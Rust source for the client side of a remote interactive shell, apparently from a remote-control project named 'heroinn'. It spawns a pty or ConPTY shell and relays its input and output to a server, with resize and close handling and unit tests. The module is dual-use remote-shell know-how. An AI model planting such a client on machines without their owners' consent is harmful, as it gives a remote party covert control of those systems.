//! Client-side interactive shell session.
//!
//! On Unix the session is a pty-backed child process; on Windows it is a
//! ConPTY process. Either way, output is relayed to the server through a
//! [`SessionBase`] channel and input arrives via [`Session::write`].

use std::io::{Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc::Sender};

#[cfg(not(target_os = "windows"))]
use std::os::fd::AsRawFd;

use heroinn_shell_protocol::{Control, WindowSize, control_prefix, encode_close};
use heroinn_util::Error;
use heroinn_util::Result;
use heroinn_util::session::{ClientSession, Session, SessionBase, SessionPacket};

#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject};

#[cfg(target_os = "windows")]
use conpty::*;

/// A live shell on the client side.
pub struct ShellClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    close_sent: Arc<AtomicBool>,
    close_started: bool,
    #[cfg(target_os = "windows")]
    process: Process,
    #[cfg(target_os = "windows")]
    writer: Option<conpty::io::PipeWriter>,
    #[cfg(not(target_os = "windows"))]
    writer: Option<std::fs::File>,
    #[cfg(not(target_os = "windows"))]
    pid: i32,
    sender: Sender<SessionBase>,
}

/// Apply a pty window size to `fd`.
#[cfg(not(target_os = "windows"))]
fn set_termsize(fd: i32, mut size: libc::winsize) -> bool {
    (unsafe { libc::ioctl(fd, libc::TIOCSWINSZ, &mut size) }) == 0
}

/// Look for a shell in the `$SHELL` environment variable.
#[cfg(not(target_os = "windows"))]
fn default_shell() -> String {
    std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
}

#[cfg(not(target_os = "windows"))]
fn is_pty_eof(error: &std::io::Error) -> bool {
    error.raw_os_error() == Some(libc::EIO) || error.kind() == std::io::ErrorKind::UnexpectedEof
}

#[cfg(not(target_os = "windows"))]
fn terminate_process_group(pid: i32) {
    unsafe {
        if libc::kill(-pid, libc::SIGTERM) != 0 {
            let _ = libc::kill(pid, libc::SIGTERM);
            return;
        }
        for _ in 0..10 {
            if libc::kill(-pid, 0) != 0 {
                return;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        let _ = libc::kill(-pid, libc::SIGKILL);
    }
}

fn send_close_once(
    sender: &Sender<SessionBase>,
    id: &str,
    clientid: &str,
    close_sent: &AtomicBool,
) {
    if close_sent.swap(true, Ordering::AcqRel) {
        return;
    }

    let packet = SessionPacket {
        id: id.to_string(),
        data: encode_close().to_vec(),
    };
    let _ = sender.send(SessionBase {
        id: id.to_string(),
        clientid: clientid.to_string(),
        packet,
    });
}

#[cfg(target_os = "windows")]
impl ClientSession for ShellClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        let closed = Arc::new(AtomicBool::new(false));
        let close_sent = Arc::new(AtomicBool::new(false));

        let process = conpty::spawn("cmd")
            .map_err(|e| Error::Other(format!("spawn conpty failed : {}", e)))?;

        let pid = process.pid();

        let id_exit = id.to_string();
        let clientid_exit = clientid.to_string();
        let close_sent_exit = close_sent.clone();
        let sender_exit = sender.clone();
        std::thread::spawn(move || {
            let handle = match unsafe {
                OpenProcess(
                    windows::Win32::System::Threading::PROCESS_ALL_ACCESS,
                    false,
                    pid,
                )
            } {
                Ok(p) => p,
                Err(e) => {
                    log::info!("open shell process error : {}", e);
                    return;
                }
            };

            if !handle.is_invalid() {
                unsafe { WaitForSingleObject(handle, 0xffffffff) };
            }

            log::info!("shell process exit");
            send_close_once(&sender_exit, &id_exit, &clientid_exit, &close_sent_exit);
        });

        let writer = process
            .input()
            .map_err(|e| Error::Other(format!("open shell input failed : {}", e)))?;
        let mut reader = process
            .output()
            .map_err(|e| Error::Other(format!("open shell output failed : {}", e)))?;

        let id_1 = id.to_string();
        let closed_1 = closed.clone();
        let close_sent_1 = close_sent.clone();
        let clientid_1 = clientid.to_string();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                let mut buf: [u8; 1024] = [0; 1024];
                let size = match reader.read(&mut buf) {
                    Ok(0) => {
                        log::info!("shell process output reached EOF");
                        send_close_once(&sender_1, &id_1, &clientid_1, &close_sent_1);
                        break;
                    }
                    Ok(size) => size,
                    Err(e) => {
                        log::error!("shell process reader thread exit : {}", e);
                        send_close_once(&sender_1, &id_1, &clientid_1, &close_sent_1);
                        break;
                    }
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                if let Err(e) = sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet,
                }) {
                    log::info!("sender closed : {}", e);
                    break;
                }
            }
            log::info!("shell worker closed");
            closed_1.store(true, Ordering::Relaxed);
        });

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed,
            close_sent,
            close_started: false,
            writer: Some(writer),
            process,
            sender,
        })
    }
}

#[cfg(not(target_os = "windows"))]
impl ClientSession for ShellClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        use std::fs::File;
        use std::os::fd::IntoRawFd;
        use std::os::unix::prelude::{CommandExt, FromRawFd};
        use std::process::{Command, Stdio};

        use nix::pty::openpty;
        use nix::unistd::{ForkResult, fork};

        let closed = Arc::new(AtomicBool::new(false));
        let close_sent = Arc::new(AtomicBool::new(false));

        let ends =
            openpty(None, None).map_err(|e| Error::Other(format!("openpty failed : {}", e)))?;
        // `openpty` hands back owning descriptors; take the raw fds so their
        // lifetime stays managed explicitly by `close()`.
        let master = ends.master.into_raw_fd();
        let slave = ends.slave.into_raw_fd();

        let mut builder = Command::new(default_shell());

        let child_pid;
        let id_exit = id.to_string();
        let clientid_exit = clientid.to_string();
        let close_sent_exit = close_sent.clone();
        let sender_exit = sender.clone();
        match unsafe { fork() } {
            Ok(ForkResult::Parent { child: pid, .. }) => {
                child_pid = pid.as_raw();
                // The child owns its copy of the slave descriptor. Keeping the
                // parent's copy open would prevent the master from observing
                // EOF after the shell exits.
                unsafe { libc::close(slave) };
                std::thread::spawn(move || {
                    let mut status = 0;
                    unsafe { libc::waitpid(i32::from(pid), &mut status, 0) };
                    log::warn!("child process exit!");
                    send_close_once(&sender_exit, &id_exit, &clientid_exit, &close_sent_exit);
                });
            }
            Ok(ForkResult::Child) => {
                unsafe { libc::ioctl(master, libc::TIOCNOTTY) };
                unsafe { libc::setsid() };
                unsafe { libc::ioctl(slave, libc::TIOCSCTTY) };

                let _ = builder
                    .stdin(unsafe { Stdio::from_raw_fd(slave) })
                    .stdout(unsafe { Stdio::from_raw_fd(slave) })
                    .stderr(unsafe { Stdio::from_raw_fd(slave) })
                    .exec();
                std::process::exit(0);
            }
            Err(e) => {
                return Err(Error::Other(format!("shell fork error : {}", e)));
            }
        }

        let ptyin = unsafe { File::from_raw_fd(master) };
        let reader_fd = unsafe { libc::dup(master) };
        if reader_fd < 0 {
            unsafe {
                libc::kill(child_pid, libc::SIGTERM);
            }
            return Err(Error::Other(format!(
                "duplicate pty master failed: {}",
                std::io::Error::last_os_error()
            )));
        }
        let mut ptyout = unsafe { File::from_raw_fd(reader_fd) };

        let id_1 = id.to_string();
        let closed_1 = closed.clone();
        let close_sent_1 = close_sent.clone();
        let clientid_1 = clientid.to_string();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                let mut buf = [0u8; 1024];

                let size = match ptyout.read(&mut buf) {
                    Ok(0) => {
                        log::info!("shell pty reached EOF");
                        send_close_once(&sender_1, &id_1, &clientid_1, &close_sent_1);
                        break;
                    }
                    Ok(size) => size,
                    Err(error) if is_pty_eof(&error) => {
                        log::debug!("shell pty closed: {error}");
                        send_close_once(&sender_1, &id_1, &clientid_1, &close_sent_1);
                        break;
                    }
                    Err(error) => {
                        log::error!("shell pty read failed: {error}");
                        send_close_once(&sender_1, &id_1, &clientid_1, &close_sent_1);
                        break;
                    }
                };

                let packet = SessionPacket {
                    id: id_1.clone(),
                    data: buf[..size].to_vec(),
                };

                if let Err(e) = sender_1.send(SessionBase {
                    id: id_1.clone(),
                    clientid: clientid_1.clone(),
                    packet,
                }) {
                    log::info!("sender closed : {}", e);
                    break;
                }
            }
            log::info!("shell worker closed");
            closed_1.store(true, Ordering::Relaxed);
        });

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed,
            close_sent,
            close_started: false,
            sender,
            writer: Some(ptyin),
            pid: child_pid,
        })
    }
}

impl Session for ShellClient {
    fn id(&self) -> &str {
        &self.id
    }

    fn clientid(&self) -> &str {
        &self.clientid
    }

    fn write(&mut self, data: &[u8]) -> Result<()> {
        let mut remaining = data;
        while let Some((control, consumed)) = control_prefix(remaining) {
            remaining = &remaining[consumed..];
            match control {
                Control::Close => {
                    log::info!("client closed");
                    self.close();
                    return Ok(());
                }
                Control::Resize(WindowSize { rows, cols }) => {
                    #[cfg(target_os = "windows")]
                    self.process
                        .resize(cols as i16, rows as i16)
                        .map_err(|e| Error::Other(format!("resize shell failed: {e}")))?;

                    #[cfg(not(target_os = "windows"))]
                    {
                        let master_fd = self
                            .writer
                            .as_ref()
                            .ok_or_else(|| Error::Other("shell input is closed".to_string()))?
                            .as_raw_fd();
                        if !set_termsize(
                            master_fd,
                            libc::winsize {
                                ws_row: rows,
                                ws_col: cols,
                                ws_xpixel: 0,
                                ws_ypixel: 0,
                            },
                        ) {
                            return Err(Error::Other("resize shell failed".to_string()));
                        }
                    }
                }
                Control::Data(_) => {}
            }
        }

        if !remaining.is_empty() {
            self.writer
                .as_mut()
                .ok_or_else(|| Error::Other("shell input is closed".to_string()))?
                .write_all(remaining)?;
        }

        Ok(())
    }

    fn alive(&self) -> bool {
        !self.closed.load(Ordering::Relaxed)
    }

    fn close(&mut self) {
        if self.close_started {
            return;
        }
        self.close_started = true;

        log::info!("shell closed");

        send_close_once(&self.sender, &self.id, &self.clientid, &self.close_sent);

        #[cfg(not(target_os = "windows"))]
        terminate_process_group(self.pid);
        #[cfg(not(target_os = "windows"))]
        {
            self.writer.take();
        }

        #[cfg(target_os = "windows")]
        {
            self.writer.take();
            if let Err(e) = self.process.exit(0) {
                log::info!("exit shell process failed : {}", e);
            }
        }

        self.closed.store(true, Ordering::Release);
    }
}

#[cfg(all(test, not(target_os = "windows")))]
mod tests {
    use std::os::fd::IntoRawFd;

    use super::{is_pty_eof, set_termsize};

    #[test]
    fn unix_pty_eof_recognizes_linux_eio_and_unexpected_eof() {
        assert!(is_pty_eof(&std::io::Error::from_raw_os_error(libc::EIO)));
        assert!(is_pty_eof(&std::io::Error::from(
            std::io::ErrorKind::UnexpectedEof
        )));
        assert!(!is_pty_eof(&std::io::Error::from(
            std::io::ErrorKind::BrokenPipe
        )));
    }

    #[test]
    fn unix_resize_treats_ioctl_success_as_true() {
        let pty = nix::pty::openpty(None, None).unwrap();
        let slave = pty.slave.into_raw_fd();
        let result = set_termsize(
            slave,
            libc::winsize {
                ws_row: 42,
                ws_col: 123,
                ws_xpixel: 0,
                ws_ypixel: 0,
            },
        );
        unsafe {
            libc::close(slave);
        }

        assert!(result);
    }

    #[test]
    fn unix_resize_reports_invalid_descriptor_as_failure() {
        assert!(!set_termsize(
            -1,
            libc::winsize {
                ws_row: 42,
                ws_col: 123,
                ws_xpixel: 0,
                ws_ypixel: 0,
            },
        ));
    }
}
